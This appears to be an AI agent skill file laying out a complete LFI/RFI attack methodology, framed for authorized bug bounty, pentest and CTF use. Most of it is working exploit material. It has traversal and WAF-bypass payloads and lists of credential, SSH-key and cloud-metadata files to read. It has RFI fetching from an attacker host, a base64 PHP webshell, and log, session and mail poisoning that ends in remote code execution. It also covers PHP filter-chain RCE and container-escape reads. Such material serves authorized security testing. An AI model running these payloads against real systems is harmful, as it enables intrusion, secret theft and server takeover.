---
name: lfi-rfi-hunter
description: >
  Elite LFI/RFI hunting skill for authorized bug bounty, pentests, and CTFs.
  ALWAYS activate for: local file inclusion, remote file inclusion, path traversal,
  directory traversal, LFI, RFI, file read, file disclosure, PHP filter chain,
  log poisoning, PHP wrapper, allow_url_include, zip://, phar://, data://,
  php://input, /proc/self/environ, nginx alias traversal, Apache path traversal,
  CVE-2021-41773, CVE-2021-43798, Grafana LFI, Jolokia LFI, SMB RFI,
  container escape file read, or ANY request to find/test/exploit file inclusion
  vulnerabilities. Covers full kill chain: recon -> surface mapping -> detection
  -> fingerprint -> exploitation -> escalation -> verification -> report.
  Zero false positive policy — every finding verified with proof.
  Built from analysis of 40+ top HackerOne LFI reports and all major LFI/RFI references.
---

# LFI-RFI Hunter — Elite File Inclusion Methodology

> **Scope reminder**: Verify authorization before testing. This skill is for authorized pentests, bug bounty programs in-scope, and CTFs only.

---

## RULE 0 — KILL LIST (Instant Reject)

Do NOT report these:
- Self LFI (reading your own uploaded file that you control) — not a finding
- "Possible LFI — needs confirmation" — confirm or kill, never report half findings
- Reading `/etc/passwd` when the app is designed to serve static files with a realpath check — read the code first
- Path traversal that cannot reach sensitive files (sandboxed chroot) — verify target is sensitive
- Theoretical filter bypass with no working PoC
- Missing Content-Disposition header on file download (not LFI)

---

## RULE 1 — VERIFICATION GATE (Zero False Positives)

Every LFI/RFI claim MUST pass ALL three checks:

```
CHECK 1 — Confirm inclusion:
  Request:  /page=../../../etc/passwd  →  Response contains "root:x:0:0:"
  If content appears: PASS
  If no content / error: FAIL → try bypasses

CHECK 2 — Confirm it's server-side inclusion (not a copy served):
  Request:  /page=/etc/hostname       →  Response contains the server's hostname
  Request:  /page=/etc/passwd         →  Must return actual /etc/passwd content
  Compare with known values (e.g., run hostname on your own box if you have access)
  If content is static / cached / client-side only: FAIL

CHECK 3 — Prove arbitrary file read (not just one hardcoded file):
  Read at least TWO different sensitive files:
    e.g. /etc/passwd AND /etc/hostname
    e.g. /etc/passwd AND /proc/self/environ
  If only one file readable: FAIL → need to prove it's not hardcoded
```

**Impact gate** — After passing verification, classify impact:
- Read: config files, source code, secrets, cloud metadata (169.254.169.254)
- Write (Zip Slip, file write traversal): potential RCE → CRITICAL
- Include + execute (PHP wrappers, log poisoning): RCE → CRITICAL

If file read returns "root:x:0:0:" but root password hash is masked: impact is MEDIUM (info leak) unless you can escalate to RCE.

---

## MASTER WORKFLOW (The Kill Chain)

### PHASE 1 — RECON & SURFACE MAPPING

**Goal**: Find every parameter and endpoint that handles file paths, names, or includes.

#### 1A — Parameter Discovery

```bash
# Wayback + Gau historical URLs (find every parameter)
gau --subs TARGET | grep -E '\?.*=' | uro | tee gau_params.txt
waybackurls TARGET | grep '=' | uro >> all_params.txt

# Katana crawling for modern SPA params
katana -u https://TARGET -d 5 -jc -kf -ef png,jpg,css,js,svg,woff -o katana.txt

# Extract unique parameter names
cat all_params.txt | grep -oP '[?&][^=&]+(?==)' | sort -u | tee params_unique.txt

# JS endpoint + parameter mining
cat katana.txt | grep '\.js$' | jsluice urls | grep -E '\?.*='
grep -roP '(fetch|axios|ajax|get|post)\s*\(\s*["\x27][^"\x27]*['"'"']?\s*[+?]' *.js 2>/dev/null
```

#### 1B — High-Value Parameter Names

File inclusion often uses these parameters. Prioritize them:

```
file=    page=    path=    doc=    view=    include=    load=
read=    pdf=     down=    data=   template=  content=   style=
loc=     cat=     dir=     show=   src=       href=      url=
lang=    root=    cfg=     config= log=       upload=    image=
img=     media=   theme=   inc=    require=   import=    f=
document= plugin=  action=  module=  controller= function=
attachment= download=  resume=  backup=  logfile=
```

#### 1C — Endpoint Discovery

```bash
# Directory brute force (common LFI-prone paths)
ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -ac
ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/Parameters/lfi.txt -ac

# Tech stack detection
webanalyze -host TARGET -crawl 2

# Check for known vulnerable CMS/plugins
# WordPress: /wp-content/plugins/, /wp-admin/admin-ajax.php?action=
# Joomla: /index.php?option=com_*
# Drupal: /node/*, /system/files/*
# Laravel: /storage/logs/laravel.log
# Confluence: /spaces/, /pages/viewpage.action?pageId=
# Grafana: /public/plugins/, /api/dashboards/
```

#### 1D — Known LFI Entry Points (from top H1 reports)

Test these application-specific patterns (from real $500-$12,000 findings):

```
# PDF export LFI (Visma $500 — H1 809819)
/page?template=../../../../etc/passwd
/export?format=pdf&template=../../../etc/passwd
/pdf?file=../../../etc/passwd

# Audio file path traversal (PortSwigger $0 — H1 2424815)
/cms/audioitems?path=../../../etc/passwd

# NuGet package registry path traversal (GitLab $12,000 — H1 822262)
/api/v4/projects/1/packages/nuget/download/../../../etc/passwd

# Grafana plugin path traversal (Aiven $1,000 — H1 1415820)
/public/plugins/../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd

# Confluence CVE-2019-3394 (Mail.ru $0 — H1 980881)
/rest/api/content?expand=../../../../etc/passwd

# Jolokia LFI (DoD — H1 2778380)
/jolokia/exec/!..!..!..!..!etc!passwd

# Apache 2.4.49 CVE-2021-41773 (IBB $4,000 — H1 1394916)
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# nginx alias traversal
/files../etc/passwd
/static../etc/passwd
/download..%2f..%2f..%2fetc/passwd

# Session file injection (WordPress unzip_file $0 — H1 205481)
/wp-admin/update.php?action=upload-plugin&file=../../../../etc/passwd

# Deeplink path traversal (TikTok — H1 2417516, Basecamp — H1 2553411)
app://open?url=file:///etc/passwd
intent://open#Intent;action=ACTION_VIEW;data=file:///etc/passwd

# Kubernetes ingress-nginx path injection (H1 2701701)
/ingress-path/../../../etc/passwd
```

---

### PHASE 2 — DETECTION & FINGERPRINT

#### 2A — Basic LFI Probe (NO false positives)

Test each parameter systematically. Start with the most obvious:

```bash
# Test basic path traversal
curl -sk "https://TARGET/page=../../../etc/passwd"
curl -sk "https://TARGET/page=../../../../etc/passwd"
curl -sk "https://TARGET/page=/etc/passwd"
curl -sk "https://TARGET/page=file:///etc/passwd"

# Check for /etc/hostname (less filtered than /etc/passwd)
curl -sk "https://TARGET/page=../../../etc/hostname"
curl -sk "https://TARGET/page=../../../../etc/hostname"

# Check /proc/self/environ (reveals internal paths + cookies)
curl -sk "https://TARGET/page=../../../proc/self/environ"

# Check index.php source via PHP filter
curl -sk "https://TARGET/page=php://filter/convert.base64-encode/resource=index.php"
curl -sk "https://TARGET/page=php://filter/convert.base64-encode/resource=../../index.php"

# Check config files
curl -sk "https://TARGET/page=../../../var/www/html/.env"
curl -sk "https://TARGET/page=../../../var/www/html/config.php"
curl -sk "https://TARGET/page=../../../app/config/app.php"
```

**Detection signals (LFI confirmed if ANY of these):**
- Response contains `root:x:0:0:` (passwd)
- Response contains base64-encoded PHP (PHP filter worked)
- Response contains `SERVER_SOFTWARE`, `DB_HOST`, `APP_KEY` etc.
- Response contains server hostname (via hostname file)
- Response time differs between existing vs non-existing files (blind LFI oracle)

#### 2B — Blind / Error-Based LFI Oracle

When response body is always the same but errors may differ:

```bash
# Time-based oracle (file_exists behavior)
# If query is slow when file exists, fast when not → you have an oracle
curl -sk "https://TARGET/page=/etc/passwd" -w "%{time_total}\n"
curl -sk "https://TARGET/page=/nonexistent" -w "%{time_total}\n"

# Error message disclosure oracle
curl -sk "https://TARGET/page=../../../etc/passwd"
curl -sk "https://TARGET/page=../../../etc/nonexistent"
# Different error = LFI confirmed
```

#### 2C — PHP Filter Chain LFI (No File Write RCE)

From Synacktiv research — generate arbitrary PHP code via filter chains without writing files:

```bash
# Using synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain "<?php system('id'); ?>"
# Output: php://filter/convert.iconv.UTF8.CSISO2022KR|...

# Using wrapwrap (adds suffix support)
python3 wrapwrap.py /etc/passwd "" "<?php system('id');?>"

# Test the generated chain
curl -sk "https://TARGET/page=php://filter/[GENERATED_CHAIN]/resource=php://temp"
```

#### 2D — Server-Side Include (SSI) Detection

```bash
# Test for SSI
curl -sk "https://TARGET/page=<!--%23exec%20cmd=\"id\"-->"
curl -sk "https://TARGET/page=<!--#include%20virtual=\"/etc/passwd\"-->"
```

#### 2E — PHP Wrapper Detection

```bash
# Test each wrapper systematically
for wrapper in \
  "php://filter/convert.base64-encode/resource=/etc/passwd" \
  "php://input" \
  "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+" \
  "expect://id" \
  "zip://shell.jpg%23shell.php" \
  "phar://test.phar/test.txt" \
  "compress.zlib:///etc/passwd" \
  "compress.bzip2:///etc/passwd"; do
  echo "=== $wrapper ==="
  curl -sk "https://TARGET/page=$wrapper"
done
```

#### 2F — RFI Detection

```bash
# Start a listener
nc -lvnp 8080

# Test RFI
curl -sk "https://TARGET/page=http://YOUR_IP:8080/test.txt"
curl -sk "https://TARGET/page=https://YOUR_IP:8080/test.txt"
curl -sk "https://TARGET/page=ftp://YOUR_IP/test.txt"

# Windows SMB RFI (bypasses allow_url_include=Off)
curl -sk "https://TARGET/page=\\\\YOUR_IP\\share\\shell.txt"

# PHP input RFI via POST (if allow_url_include=On)
curl -sk -X POST "https://TARGET/page=php://input" -d "<?php system('id'); ?>"
```

---

### PHASE 3 — BYPASS & EVASION

#### 3A — WAF/Filter Bypass Matrix

Try in order when basic traversal is blocked:

```
# Double encoding
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# URL encoding variations
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%c0%af..%c0%afetc%c0%afpasswd
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

# Overlong UTF-8
..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
..%e0%80%af..%e0%80%afetc%e0%80%afpasswd

# Double dot-slash bypass
....//....//....//etc/passwd
..//..//..//etc/passwd

# Dot-dot-slash strip bypass
..././..././..././etc/passwd
....\/....\/....\/etc/passwd

# Mixed slash (Windows + Linux)
..\/../..\/../etc/passwd

# Absolute path bypass
/etc/passwd

# Semicolon bypass (Tomcat, Java)
/..;/..;/..;/etc/passwd

# Null byte (PHP < 5.3.4)
../../../../etc/passwd%00
../../../../etc/passwd%00.png

# Path truncation (4096 chars)
../../../../etc/passwd/./././././.[ADD MANY MORE]

# Case variation (Windows)
..\..\WINDOWS\win.ini
..\..\..\windows\system32\drivers\etc\hosts

# Query string bypass
../../../../etc/passwd?
../../../../etc/passwd?a=1

# Fragment bypass
../../../../etc/passwd#fragment

# Double parameter pollution
page=../../../etc/passwd&page=index.php

# Long path directory (using valid path)
/valid/long/path/../../../../etc/passwd
/assets/../../../etc/passwd

# nginx alias traversal (files../)
files../etc/passwd
files..%2fetc%2fpasswd

# Jolokia ! delimiter (H1 2778380)
!..!..!..!etc!passwd

# SMB path on Windows
\\localhost\C$\windows\win.ini

# PHP filter chain (bypasses everything - no file write needed)
php://filter/[GENERATED_CHAIN]/resource=php://temp
```

#### 3B — Protocol-relative bypass

```bash
curl -sk "https://TARGET/page=//etc/passwd"
curl -sk "https://TARGET/page=file:///etc/passwd"
curl -sk "https://TARGET/page=file:///etc/hostname"
```

#### 3C — PHP Wrapper Bypasses

When direct include is blocked:

```bash
# Wrapper within wrapper
php://filter/convert.base64-encode/resource=php://filter/convert.base64-encode/resource=/etc/passwd

# Nested base64
php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd

# Case variation
PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=/etc/passwd

# Using iconv to obfuscate
php://filter/read=convert.iconv.utf-8.utf-16|convert.base64-encode/resource=/etc/passwd

# Charset filter bypass for character restrictions
php://filter/read=convert.iconv.utf-8.utf-7/resource=/etc/passwd
```

---

### PHASE 4 — EXPLOITATION & ESCALATION

#### 4A — File Disclosure Targets

**Immediate high-value targets (try in order):**

```
# Linux — System files
/etc/passwd              → User enumeration
/etc/shadow              → Password hashes (if readable)
/etc/hostname            → Server hostname (verify LFI independently)
/etc/issue               → OS version
/etc/crontab             → Scheduled tasks
/etc/apache2/apache2.conf → Apache configuration
/etc/nginx/nginx.conf    → Nginx configuration
/etc/php.ini             → PHP configuration
/etc/ssh/sshd_config     → SSH configuration
/proc/self/environ       → Environment variables (session tokens, DB creds)
/proc/self/cmdline       → Running command
/proc/self/fd/0          → stdin
/proc/self/fd/1          → stdout
/proc/self/fd/2          → stderr
/proc/self/fd/23         → May contain access log (log poisoning)
/proc/version            → Kernel version
/proc/mounts             → Mount points
/proc/net/tcp            → Active TCP connections
/proc/net/fib_trie       → Routing table

# Linux — Web Application
/var/www/html/.env          → Laravel/WordPress secrets
/var/www/html/config.php    → DB credentials
/var/www/html/.git/config   → Git repo config
/var/www/html/wp-config.php → WordPress config
/var/www/html/index.php     → Source code
/var/www/html/database.php  → DB connection
/var/log/apache2/access.log  → Apache access log (log poisoning → RCE)
/var/log/apache2/error.log   → Apache error log
/var/log/nginx/access.log    → Nginx access log (log poisoning → RCE)
/var/log/auth.log            → SSH auth log (log poisoning)
/var/log/mail.log            → Mail log (log poisoning)

# Linux — Secrets & Cloud
/root/.ssh/id_rsa           → SSH private key
/root/.bash_history         → Command history
/home/USER/.ssh/id_rsa      → User SSH key
/home/USER/.bash_history    → User bash history
/var/run/secrets/kubernetes.io/serviceaccount/token  → K8s SA token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt → K8s CA cert
/etc/kubernetes/admin.conf  → Kubernetes admin config
~/.aws/credentials          → AWS credentials
~/.aws/config               → AWS config
~/.gcloud/credentials.db    → GCloud credentials
/opt/bitnami/wordpress/wp-config.php  → Bitnami WP config

# Linux — PHP Sessions
/var/lib/php/sessions/sess_PHPSESSID
/var/lib/php/session/sess_PHPSESSID
/tmp/sess_PHPSESSID
/var/lib/php5/sess_PHPSESSID
/var/lib/php7/sessions/sess_PHPSESSID

# Linux — Log files (for log poisoning)
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/apache/error.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail.log
/var/log/httpd/access_log
/var/log/httpd/error_log

# Windows — System files
..\windows\win.ini
..\windows\system32\drivers\etc\hosts
..\windows\system32\eula.txt
..\boot.ini
..\windows\php.ini
..\windows\system32\config\SAM
C:\boot.ini
C:\windows\win.ini
C:\windows\system32\eula.txt
C:\users\administrator\desktop\desktop.ini
C:\inetpub\logs\logFiles\

# Windows — Web
..\inetpub\wwwroot\web.config
..\xampp\htdocs\config.php
..\xampp\php\php.ini
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\wp-config.php

# Cloud metadata (SSRF + LFI chain — H1 1189367)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### 4B — Log Poisoning → RCE

**Apache/Nginx log poisoning:**

```bash
# Step 1: Inject PHP code into User-Agent
curl -sk "https://TARGET/" -H "User-Agent: <?php system(\$_GET['c']); ?>"

# Step 2: Include the log file via LFI
curl -sk "https://TARGET/page=/var/log/apache2/access.log&c=id"
curl -sk "https://TARGET/page=/var/log/nginx/access.log&c=id"
curl -sk "https://TARGET/page=/var/log/httpd/access_log&c=id"

# Alternative: Inject via Referer header
curl -sk "https://TARGET/" -H "Referer: <?php system(\$_GET['c']); ?>"

# Alternative: Inject via Cookie
curl -sk "https://TARGET/" -H "Cookie: PHPSESSID=<?php system(\$_GET['c']); ?>"
```

**SSH log poisoning:**

```bash
# Step 1: Connect via SSH with PHP code as username
ssh "<?php system(\$_GET['c']); ?>"@TARGET

# Step 2: Include the auth log via LFI
curl -sk "https://TARGET/page=/var/log/auth.log&c=id"
```

**Mail log poisoning:**

```bash
# Step 1: Send email with PHP payload
telnet TARGET 25
MAIL FROM: <admin@TARGET>
RCPT TO: <?php system($_GET['c']); ?>
DATA
Test
.

# Step 2: Include mail log
curl -sk "https://TARGET/page=/var/log/mail.log&c=id"
```

#### 4C — PHP Session Poisoning

```bash
# Step 1: Inject PHP into session via parameter
curl -sk "https://TARGET/?lang=<?php system(\$_GET['c']); ?>" -v 2>&1 | grep PHPSESSID

# Step 2: Read session file via LFI
curl -sk "https://TARGET/page=/var/lib/php/sessions/sess_PHPSESSID&c=id"
curl -sk "https://TARGET/page=/tmp/sess_PHPSESSID&c=id"
```

#### 4D — PHP Filter Chain → RCE (No File Write)

Using the Synacktiv PHP filter chain generator (works on PHP 7.0-8.3+):

```bash
# Install
git clone https://github.com/synacktiv/php_filter_chain_generator.git
cd php_filter_chain_generator

# Generate chain for `<?=exec('id');?>`
python3 php_filter_chain_generator.py --chain "<?=exec('id');?>"

# Exploit
curl -sk "https://TARGET/page=php://filter/[GENERATED_CHAIN]/resource=php://temp"
```

#### 4E — LFI via PHPArchive (phar://) — If file upload exists

```bash
# Create malicious phar
# phar_test.php:
# <?php
# $phar = new Phar('test.phar');
# $phar->startBuffering();
# $phar->addFromString('test.txt', 'file content');
# $phar->setStub('<?php __HALT_COMPILER(); ? >');
# $phar->stopBuffering();

# Upload test.phar or test.jpg (phar works with any extension)
# Include it:
curl -sk "https://TARGET/page=phar://uploads/test.jpg/shell.txt"
```

#### 4F — SSRF → LFI (Evernote pattern — H1 1189367)

When the application fetches URLs internally:

```bash
# If LFI gives include() and app makes HTTP requests
# You can chain SSRF to read files
curl -sk "https://TARGET/fetch?url=file:///etc/passwd"
curl -sk "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
```

#### 4G — Container Escape LFI (Semmle pattern — H1 694181, 697055)

When LFI is in a containerized environment:

```bash
# Read host filesystem from container
curl -sk "https://TARGET/page=../../../hostfs/etc/passwd"
curl -sk "https://TARGET/page=../../../../hostfs/proc/1/environ"

# Read Docker socket (if accessible)
curl -sk "https://TARGET/page=../../../var/run/docker.sock"

# Read k8s secrets
curl -sk "https://TARGET/page=../../../var/run/secrets/kubernetes.io/serviceaccount/token"
```

---

### PHASE 5 — VERIFICATION (No False Positives Allowed)

#### 5A — Manual Verification Checklist

For EVERY finding, run through this checklist. Report only if ALL applicable checks pass:

```
[ ] CHECK 1 — Basic LFI confirmed:
    Read /etc/passwd → "root:x:0:0:" present
    Read /etc/hostname → returns actual server hostname

[ ] CHECK 2 — Not a cached/static copy:
    Read a dynamic file (/proc/self/environ) → values change per request
    Read multiple files → different responses for different paths

[ ] CHECK 3 — Impact determined:
    Can you read source code? (PHP filter on index.php)
    Can you read secrets? (.env, config.php, .git/config)
    Can you escalate to RCE? (log poisoning, PHP filter chain)
    Can you read cloud metadata? (SSRF chain)
    Can you read beyond container? (hostfs escape)

[ ] CHECK 4 — Exploitability confirmed:
    Provide working curl commands as PoC
    Include the parameter, exact path, and full response
```

#### 5B — PoC Template

For each verified finding, provide:

```
# PoC — LFI on [PARAMETER] at [ENDPOINT]

## Request 1 — /etc/passwd
curl -sk "https://TARGET/[ENDPOINT]?[PARAM]=../../../etc/passwd"
# Response (relevant portion):
#   root:x:0:0:root:/root:/bin/bash
#   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
#   ...

## Request 2 — /etc/hostname
curl -sk "https://TARGET/[ENDPOINT]?[PARAM]=../../../etc/hostname"
# Response:
#   TARGET-SERVER-HOSTNAME

## Request 3 — Source code via PHP filter
curl -sk "https://TARGET/[ENDPOINT]?[PARAM]=php://filter/convert.base64-encode/resource=index.php"
# Response (Base64 decoded):
#   <?php
#   ... full source code ...

## Request 4 — RCE PoC (log poisoning)
curl -sk "https://TARGET/" -H "User-Agent: <?php system('id'); ?>"
curl -sk "https://TARGET/[ENDPOINT]?[PARAM]=/var/log/apache2/access.log&c=id"
# Response:
#   uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### PHASE 6 — REAL REPORT PATTERNS (From Top H1 Reports)

Patterns extracted from top 40 disclosed HackerOne LFI reports:

| # | Pattern | Bounty | Technique | Source (H1) |
|---|---------|--------|-----------|-------------|
| 1 | HTML injection in PDF export | $500 | LFI via template parameter | 809819 |
| 2 | SSRF + LFI leaking AWS metadata | $0 | Chain SSRF → file:// | 1189367 |
| 3 | Auth cookie + path traversal | $0 | Cookie misuse | 876295 |
| 4 | Relative path in attachment download | $5,000 | Write files anywhere | 713006 |
| 5 | Container escape → host file read | $2,000 | hostfs escape | 697055 |
| 6 | Path traversal in filename | $0 | Mac client | 727727 |
| 7 | RCE via file write + path traversal | $6,000 | VPN client | 2995025 |
| 8 | SSTI + path traversal → RCE | $2,000 | Chained vulns | 536130 |
| 9 | CMS audio items path traversal | $0 | Path in /cms/audioitems | 2424815 |
| 10 | Path traversal → RCE (GitLab) | $12,000 | NuGet registry | 733072 |
| 11 | Unauthenticated LFI log info | $0 | Log file direct read | 272578 |
| 12 | WordPress unzip_file traversal | $0 | Zip extraction | 205481 |
| 15 | Grafana 8.x unauthenticated LFR | $1,000 | Plugin path | 1415820 |
| 17 | Apache 2.4.49 path traversal | $4,000 | CVE-2021-41773 | 1394916 |
| 18 | NuGet path traversal (GitLab) | $12,000 | Package registry | 822262 |
| 19 | Vanilla Forums AddonManager | $900 | RCE via traversal | 411140 |
| 20 | SSRF + LFI site audit tool | $0 | Chain SSRF | 794099 |
| 23 | LFI + SSRF via XXE | $1,500 | Rockstar games | 347139 |
| 26 | LFI bypass filter via redirect | $100 | Redirect to file:// | 996899 |
| 27 | Unauthenticated LFI Jolokia ! | $0 | Jolokia delimiter | 2778380 |
| 28 | Monkey-patching Buffer internals | $2,430 | Node.js | 2434811 |
| 32 | Path traversal + command injection | $0 | Trellix ESM | 2817658 |
| 40 | Apache mod_rewrite weakness | $4,920 | CVE-2024-38475 | 2585378 |

**Key lessons from top reports:**
1. **Chaining is key** — SSRF → LFI (H1 1189367), XXE → LFI (H1 347139), SSTI → LFI (H1 536130)
2. **Container escape** — Always check /hostfs/ paths when in containers (H1 694181, 697055)
3. **PDF/export features** — Template injection in PDF generators (H1 809819, Visma $500)
4. **Windows paths** — Drive names, backslashes, SMB shares (H1 2307225)
5. **CMS plugins** — WordPress, Grafana, Vanilla Forums plugin systems (H1 1415820, 411140)
6. **Jolokia JMX** — ! delimiter bypass on JBoss/Jolokia endpoints (H1 2778380)
7. **Rewrite rules** — Apache mod_rewrite + mod_proxy can expose files (H1 2585378)
8. **Mobile deeplinks** — file:// protocol in app deeplinks (H1 2417516, 2553411)

---

### PHASE 7 — TOOLSET

#### 7A — Automated Tools

```bash
# dotdotpwn — Best path traversal fuzzer
git clone https://github.com/wireghoul/dotdotpwn
./dotdotpwn.pl -m http -h TARGET -O -f /etc/passwd -k "root:x"

# LFISuite — Full LFI scanner + exploiter
git clone https://github.com/D35m0nd142/LFISuite

# Kadimus — LFI scanner with RCE
git clone https://github.com/P0cL4bs/Kadimus
./kadimus -u "https://TARGET/page=INJECT" -f /etc/passwd

# PHP filter chain generator (Synacktiv)
git clone https://github.com/synacktiv/php_filter_chain_generator.git
python3 php_filter_chain_generator.py --chain "<?=exec('id');?>"

# Wrapwrap — PHP filter chain with suffix support
git clone https://github.com/ambionics/wrapwrap.git

# Lightyear — Blind file-dump oracle
git clone https://github.com/ambionics/lightyear.git

# fuff — Ultra-fast web fuzzer for LFI
ffuf -u "https://TARGET/page=FUZZ" -w SecLists/Fuzzing/LFI/LFI-etcpasswd-Linux.txt

# Commix — Command injection exploitation (pairs with LFI)
git clone https://github.com/commixproject/commix

# Nginx alias traversal scanner
git clone https://github.com/ngalongc/Automate_Misconfig
```

#### 7B — Wordlists

```bash
# SecLists LFI wordlists
SecLists/Fuzzing/LFI/LFI-etcpasswd-Linux.txt
SecLists/Fuzzing/LFI/LFI-grace.txt
SecLists/Fuzzing/LFI/LFI-etcshadow-Linux.txt
SecLists/Fuzzing/LFI/LFI-Jhaddix.txt

# PayloadsAllTheThings LFI
PayloadsAllTheThings/File Inclusion/Intruders/
PayloadsAllTheThings/File Inclusion/Files/

# Custom wordlists (created for this skill)
# See references/lfi-payloads.txt
# See references/interesting-files.txt
```

#### 7B — Parameter Fuzzing with ffuf

```bash
# Fuzz LFI parameters (comprehensive)
ffuf -u "https://TARGET/FUZZ=../../../etc/passwd" \
  -w params_unique.txt \
  -mr "root:x:0:0" \
  -ac -t 50

# Fuzz path traversal depth
seq 1 15 | while read i; do
  dots=$(printf '../%.0s' $(seq 1 $i))
  curl -sk "https://TARGET/page=${dots}etc/passwd"
done

# Fuzz URL encoding variants
ffuf -u "https://TARGET/page=FUZZ" \
  -w lfi-bypasses.txt \
  -mr "root:x" \
  -ac
```

---

### PHASE 8 — REPORT WRITING

#### 8A — Report Structure

```
Title: [Type] LFI/RFI in [Parameter] at [Endpoint]

Vulnerability Type: Local File Inclusion / Remote File Inclusion / Path Traversal
Severity: Critical / High / Medium
Endpoint: https://TARGET/[endpoint]
Parameter: [param name]
Technique: [e.g., path traversal / PHP filter / log poisoning]

Description:
  Brief description of how the parameter is used and why it's vulnerable.

Steps to Reproduce:
  1. Navigate to [endpoint]
  2. Set [param] to [payload]
  3. Observe [evidence]

PoC:
  ```bash
  curl -sk "https://TARGET/[endpoint]?[param]=[payload]"
  ```
  [Response excerpt]

Impact:
  - Sensitive file disclosure (passwd, shadow, config)
  - Source code leakage
  - [If RCE] Remote Code Execution
  - [If cloud] Cloud metadata access
  - [If container] Container escape

Remediation:
  - Validate and sanitize file paths
  - Use whitelist of allowed files
  - Disable dangerous PHP functions
  - Apply principle of least privilege

References:
  - https://hackerone.com/reports/[REPORT_ID]
  - https://owasp.org/www-project-web-security-testing-guide/
```

---

### QUICK REFERENCE — COMMAND CHEAT SHEET

```bash
# === RECON ===
gau --subs TARGET | grep -E '\?.*=' | uro > params.txt
katana -u https://TARGET -d 5 -jc -kf -ef png,jpg,css,js -o katana.txt

# === BASIC LFI TEST ===
curl -sk "https://TARGET/page=../../../etc/passwd" | grep -q "root:x" && echo "LFI!"

# === PHP FILTER SOURCE READ ===
curl -sk "https://TARGET/page=php://filter/convert.base64-encode/resource=index.php"

# === PHP FILTER CHAIN RCE ===
python3 php_filter_chain_generator.py --chain '<?=exec("id");?>'
curl -sk "https://TARGET/page=php://filter/[CHAIN]/resource=php://temp"

# === LOG POISONING ===
curl -sk "https://TARGET/" -H "User-Agent: <?php system(\$_GET['c']); ?>"
curl -sk "https://TARGET/page=/var/log/apache2/access.log&c=id"

# === SESSION POISONING ===
curl -sk "https://TARGET/?lang=<?php system(\$_GET['c']); ?>" -v 2>&1 | grep PHPSESSID
curl -sk "https://TARGET/page=/var/lib/php/sessions/sess_[PHPSESSID]&c=id"

# === CLOUD METADATA SSRF ===
curl -sk "https://TARGET/page=http://169.254.169.254/latest/meta-data/"

# === DOTDOTPWN ===
dotdotpwn.pl -m http -h TARGET -O -f /etc/passwd -k "root:x"

# === FFFU LFI FUZZING ===
ffuf -u "https://TARGET/page=FUZZ" -w SecLists/Fuzzing/LFI/LFI-etcpasswd-Linux.txt -mr "root:x"
```
